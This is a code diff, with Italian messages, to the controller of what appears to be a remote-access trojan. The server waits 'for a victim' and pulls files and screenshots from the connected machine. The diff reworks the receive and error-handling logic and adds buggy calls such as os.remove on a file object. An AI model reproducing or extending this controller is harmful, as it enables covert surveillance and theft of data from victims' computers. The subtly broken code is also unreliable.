@@ -52,7 +52,7 @@ def serverConnection():
         server.bind(ADDR)
         server.listen(5)
         print()
-        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Starting the server...", colour="green", ncols=50,
+        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "[STARTING] Starting the server...", colour="green", ncols=65,
                       bar_format="{desc}: {percentage:3.0f}% {bar}"):
             sleep(0.2)
         print(f"[LISTENING] The Sever is waiting for a victim...\n")
@@ -224,14 +224,17 @@ def remoteControl(clientConnection,buff):
                         for i in tqdm(range(20), desc= Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                             sleep(0.2)
 
-                        scritti=0
-                        while scritti < int(filesize):
-                            scritti=scritti + file.write(clientConnection.recv(int(filesize)+1024))
-
+                        scritti=file.write(clientConnection.recv(int(filesize)))
                         file.close()
+
                         if os.path.getsize(comando[10:len(comando) - 1]) <= 0:
                             fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
                             print("Download fallito\n")
+                            os.remove(file)
+                        elif scritti < int(filesize):
+                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
+                            print("Download fallito\n")
+                            os.remove(file)
                         else:
                             fileLog = fileLog + "\n" + f"File scaricato correttamente\n" + "\n"
                             print(f"File scaricato correttamente\n")
@@ -295,28 +298,34 @@ def remoteControl(clientConnection,buff):
 
             elif comando == "screenshot":
                 nomeFoto = input("Inserire nome foto (.png/.jpeg): ")
-
                 fileLog = fileLog + "\n" + "Inserire nome foto: " + nomeFoto + "\n"
 
                 try:
                     file = open(nomeFoto, 'wb')
                     filesize=clientConnection.recv(1024).decode(FORMAT)
+                    print(filesize)
 
-                    for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
-                        sleep(0.2)
+                    if filesize[0:7] != "[ERROR]":
+                        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                            sleep(0.2)
 
-                    scritti = 0
-                    while scritti < int(filesize):
-                        scritti = scritti + file.write(clientConnection.recv(int(filesize)))
+                        scritti = file.write(clientConnection.recv(int(filesize)))
+                        file.close()
 
-                    file.close()
-
-                    if os.path.getsize(nomeFoto) <= 0:
-                        fileLog = fileLog + "\n" + "Screenshot fallito\n" + "\n"
-                        print("Screenshot fallito\n")
+                        if os.path.getsize(nomeFoto) <= 0:
+                            fileLog = fileLog + "\n" + "Screenshot fallito\n" + "\n"
+                            print("Screenshot fallito\n")
+                            os.remove(file)
+                        elif scritti < int(filesize):
+                            fileLog = fileLog + "\n" + "Download fallito\n" + "\n"
+                            print("Download fallito\n")
+                            os.remove(file)
+                        else:
+                            fileLog = fileLog + "\n" + f"Screenshot scaricato correttamente\n" + "\n"
+                            print(f"Screenshot scaricato correttamente\n")
+                        time.sleep(2)
                     else:
-                        fileLog = fileLog + "\n" + f"Screenshot scaricato correttamente\n" + "\n"
-                        print(f"Screenshot scaricato correttamente\n")
+                        raise Exception
 
                 except:
                     traceback.print_exc()
